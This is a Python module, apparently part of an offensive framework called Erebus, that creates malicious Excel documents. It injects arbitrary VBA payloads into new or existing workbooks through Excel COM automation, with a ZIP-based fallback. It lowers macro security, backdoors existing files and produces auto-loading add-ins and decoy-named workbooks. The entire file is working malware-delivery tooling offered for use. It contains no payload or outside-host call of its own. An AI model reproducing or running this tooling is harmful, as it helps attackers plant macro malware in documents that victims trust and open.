"""
Excel Maldoc Module for Erebus Helper
Injects VBA payloads into XLSX/XLAM documents on a Windows host via COM automation.

Supported output formats
------------------------
* xlsx  - Excel Macro-Enabled Workbook (.xlsm output, opened as .xlsx decoy)
* xlsm  - Excel Macro-Enabled Workbook
* xlam  - Excel Add-In (auto-loads on Excel start, no user interaction needed)

The Docker container (Linux) produces the VBA source code and, optionally, a
decoy XLSX file.  This module is invoked on the operator's Windows host to
perform the COM-based injection that Linux cannot do reliably.

Requires:
    pip install pywin32     (or: pip install pywin32==306)
    Microsoft Excel installed on the host.

Fallback:
    If pywin32 / Excel is unavailable the module falls back to the ZIP-based
    injection already implemented in plugin_payload_maldocs.py so that the
    helper still produces *some* output on Linux (for testing / CI).
"""

import logging
import os
import shutil
import sys
import tempfile
from pathlib import Path
from typing import Optional, Tuple

logger = logging.getLogger("ErebusHelper.Maldoc")

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# Excel file format constants (XlFileFormat enum)
_XL_FORMAT_XLSM  = 52   # xlOpenXMLWorkbookMacroEnabled  (.xlsm)
_XL_FORMAT_XLAM  = 55   # xlOpenXMLAddIn                 (.xlam)
_XL_FORMAT_XLSB  = 50   # xlExcel12                      (.xlsb, binary - not used here)

# VBA module type constants
_VBA_MODULE_TYPE_STANDARD  = 1   # vbext_ct_StdModule
_VBA_MODULE_TYPE_CLASS     = 2   # vbext_ct_ClassModule
_VBA_MODULE_TYPE_DOCUMENT  = 100 # vbext_ct_Document (ThisWorkbook / Sheet)


# ============================================================================
# Helper: locate Excel / check COM availability
# ============================================================================

def _com_available() -> bool:
    """Return True if win32com.client can be imported (Windows + pywin32)."""
    try:
        import win32com.client  # noqa: F401
        return True
    except ImportError:
        return False


def _get_excel_app():
    """
    Create a hidden Excel application COM object.

    Returns the ``win32com.client.Dispatch`` instance on success, or raises
    ``RuntimeError`` if Excel / pywin32 is unavailable.
    """
    if not _com_available():
        raise RuntimeError(
            "pywin32 not found.  "
            "Install it with: pip install pywin32  (Windows only)"
        )

    import win32com.client

    try:
        excel = win32com.client.Dispatch("Excel.Application")
    except Exception as exc:
        raise RuntimeError(f"Failed to start Excel via COM: {exc}") from exc

    excel.Visible = False
    excel.DisplayAlerts = False
    excel.AutomationSecurity = 1   # msoAutomationSecurityLow - allow macros to be added
    return excel


# ============================================================================
# Core injection logic
# ============================================================================

def _inject_via_com(
    vba_code: str,
    output_path: str,
    source_excel: Optional[str],
    fmt: str,
    module_name: str = "ErebusPayload",
    overwrite_module: bool = True,
) -> Tuple[bool, str]:
    """
    Inject *vba_code* into an Excel workbook using COM automation.

    Parameters
    ----------
    vba_code : str
        VBA source code to inject (full module contents, not just the Sub body).
    output_path : str
        Absolute path where the output file (.xlsm / .xlam) will be saved.
    source_excel : str or None
        Path to an existing Excel file to backdoor.  Pass ``None`` to create a
        new blank workbook.
    fmt : str
        Target format: ``"xlsm"``, ``"xlsx"``, or ``"xlam"``.
    module_name : str
        Name of the VBA module to create / overwrite.
    overwrite_module : bool
        If True and a module with *module_name* already exists, remove it first.

    Returns
    -------
    (success: bool, message: str)
    """
    xl_format = {
        "xlsm": _XL_FORMAT_XLSM,
        "xlsx": _XL_FORMAT_XLSM,   # save as xlsm regardless of requested ext
        "xlam": _XL_FORMAT_XLAM,
    }.get(fmt.lower(), _XL_FORMAT_XLSM)

    out = Path(output_path).resolve()
    out.parent.mkdir(parents=True, exist_ok=True)

    # Force correct extension
    ext_map = {_XL_FORMAT_XLSM: ".xlsm", _XL_FORMAT_XLAM: ".xlam"}
    correct_ext = ext_map[xl_format]
    if out.suffix.lower() != correct_ext:
        out = out.with_suffix(correct_ext)
        logger.info(f"Adjusted output extension to {correct_ext}: {out.name}")

    excel = None
    wb = None
    try:
        excel = _get_excel_app()

        if source_excel:
            src = Path(source_excel).resolve()
            if not src.exists():
                return False, f"Source Excel file not found: {source_excel}"
            wb = excel.Workbooks.Open(str(src))
            logger.info(f"Opened source workbook: {src.name}")
        else:
            wb = excel.Workbooks.Add()
            logger.info("Created new blank workbook")

        # Access the VBA project
        try:
            vba_project = wb.VBProject
        except Exception as exc:
            return False, (
                f"Cannot access VBA project: {exc}.  "
                "Ensure 'Trust access to the VBA project object model' is enabled "
                "in Excel > Options > Trust Center > Macro Settings."
            )

        components = vba_project.VBComponents

        # Remove existing module with the same name if requested
        if overwrite_module:
            for comp in components:
                if comp.Name == module_name:
                    try:
                        components.Remove(comp)
                        logger.info(f"Removed existing module '{module_name}'")
                    except Exception:
                        pass
                    break

        # Add a new standard module and insert the code
        new_mod = components.Add(_VBA_MODULE_TYPE_STANDARD)
        new_mod.Name = module_name
        new_mod.CodeModule.AddFromString(vba_code)
        logger.info(f"Injected VBA module '{module_name}' ({len(vba_code)} chars)")

        # Save in the appropriate format
        wb.SaveAs(str(out), FileFormat=xl_format)
        logger.info(f"Saved workbook as {out.name} (format {xl_format})")

        wb.Close(SaveChanges=False)
        wb = None
        excel.Quit()
        excel = None

        if not out.exists():
            return False, "Excel saved cleanly but output file not found on disk"

        size = out.stat().st_size
        logger.info(f"Output: {out}  ({size:,} bytes)")
        return True, str(out)

    except Exception as exc:
        logger.error(f"COM injection failed: {exc}")
        return False, str(exc)
    finally:
        # Always attempt a clean shutdown to avoid orphaned Excel processes
        try:
            if wb is not None:
                wb.Close(SaveChanges=False)
        except Exception:
            pass
        try:
            if excel is not None:
                excel.Quit()
        except Exception:
            pass


# ============================================================================
# ZIP-based fallback (Linux / no Excel)
# ============================================================================

def _inject_via_zip(
    vba_code: str,
    output_path: str,
    source_excel: Optional[str],
    fmt: str,
) -> Tuple[bool, str]:
    """
    Minimal ZIP-structure VBA injection for Linux / non-Windows hosts.

    This reuses the logic already present in plugin_payload_maldocs.py.
    The result is best-effort - Excel may require repair on first open.
    """
    try:
        # Resolve plugin path relative to this module
        _root = Path(__file__).resolve().parent.parent.parent.parent
        sys.path.insert(0, str(_root))

        from erebus_wrapper.erebus.modules.plugin_payload_maldocs import PayloadMalDocsPlugin
        plugin = PayloadMalDocsPlugin()

        out = Path(output_path)
        if source_excel:
            result_path = plugin.backdoor_existing_excel(
                source_excel=source_excel,
                vba_payload=vba_code,
                output_path=str(out),
            )
        else:
            result_path = plugin.generate_excel_payload(
                payload_path=str(out.parent),
                vba_payload=vba_code,
                output_path=str(out),
            )

        if result_path and Path(result_path).exists():
            return True, str(result_path)
        return False, "ZIP injection produced no output"

    except Exception as exc:
        return False, f"ZIP fallback failed: {exc}"


# ============================================================================
# Public entry-point
# ============================================================================

class ExcelMaldocHelper:
    """
    High-level helper for XLSX / XLAM maldoc creation.

    Prefers COM automation (Excel on Windows) and falls back to ZIP injection.
    """

    def __init__(self, prefer_com: bool = True):
        self._use_com = prefer_com and _com_available()
        if not self._use_com:
            logger.warning(
                "pywin32 / Excel not available - using ZIP-based fallback.  "
                "For reliable VBA injection run on a Windows host with pywin32 installed."
            )

    # ------------------------------------------------------------------
    # inject_vba
    # ------------------------------------------------------------------

    def inject_vba(
        self,
        vba_code: str,
        output_path: str,
        source_excel: Optional[str] = None,
        fmt: str = "xlsm",
        module_name: str = "ErebusPayload",
    ) -> Tuple[bool, str]:
        """
        Inject VBA into an Excel document.

        Parameters
        ----------
        vba_code : str
            Full VBA source code (e.g. the contents of a .bas file).
        output_path : str
            Where to write the output file.
        source_excel : str, optional
            Existing Excel file to backdoor.  Creates a blank workbook if None.
        fmt : str
            Target format: ``"xlsm"``, ``"xlsx"`` (saved as xlsm), or ``"xlam"``.
        module_name : str
            VBA module name inside the workbook.

        Returns
        -------
        (success: bool, message: str)
        """
        if self._use_com:
            logger.info("Using COM-based Excel injection")
            return _inject_via_com(
                vba_code=vba_code,
                output_path=output_path,
                source_excel=source_excel,
                fmt=fmt,
                module_name=module_name,
            )
        else:
            logger.info("Using ZIP-based Excel injection (fallback)")
            return _inject_via_zip(
                vba_code=vba_code,
                output_path=output_path,
                source_excel=source_excel,
                fmt=fmt,
            )

    # ------------------------------------------------------------------
    # from_bas_file  (convenience wrapper)
    # ------------------------------------------------------------------

    def from_bas_file(
        self,
        bas_path: str,
        output_path: str,
        source_excel: Optional[str] = None,
        fmt: str = "xlsm",
        module_name: str = "ErebusPayload",
    ) -> Tuple[bool, str]:
        """
        Load VBA from a ``.bas`` file produced by the builder, then inject.

        Parameters mirror :meth:`inject_vba` except *bas_path* replaces
        *vba_code*.
        """
        bas = Path(bas_path)
        if not bas.exists():
            return False, f"VBA .bas file not found: {bas_path}"

        try:
            vba_code = bas.read_text(encoding="utf-8")
        except Exception as exc:
            return False, f"Could not read .bas file: {exc}"

        return self.inject_vba(
            vba_code=vba_code,
            output_path=output_path,
            source_excel=source_excel,
            fmt=fmt,
            module_name=module_name,
        )


# ============================================================================
# Module-level convenience wrapper
# ============================================================================

def inject_vba_maldoc(
    bas_file: str,
    output_path: str,
    source_excel: Optional[str] = None,
    fmt: str = "xlsm",
    module_name: str = "ErebusPayload",
    prefer_com: bool = True,
) -> Tuple[bool, str]:
    """
    Convenience function: inject VBA from *bas_file* into an Excel document.

    Parameters
    ----------
    bas_file : str
        Path to the .bas VBA module file generated by the Erebus builder.
    output_path : str
        Destination path for the output Excel file.
    source_excel : str, optional
        Existing Excel file to backdoor.  If None a blank workbook is created.
    fmt : str
        ``"xlsm"``, ``"xlsx"``, or ``"xlam"``.
    module_name : str
        VBA module name inside the workbook.
    prefer_com : bool
        Prefer COM automation over ZIP injection.

    Returns
    -------
    (success: bool, message: str)
    """
    helper = ExcelMaldocHelper(prefer_com=prefer_com)
    return helper.from_bas_file(
        bas_path=bas_file,
        output_path=output_path,
        source_excel=source_excel,
        fmt=fmt,
        module_name=module_name,
    )
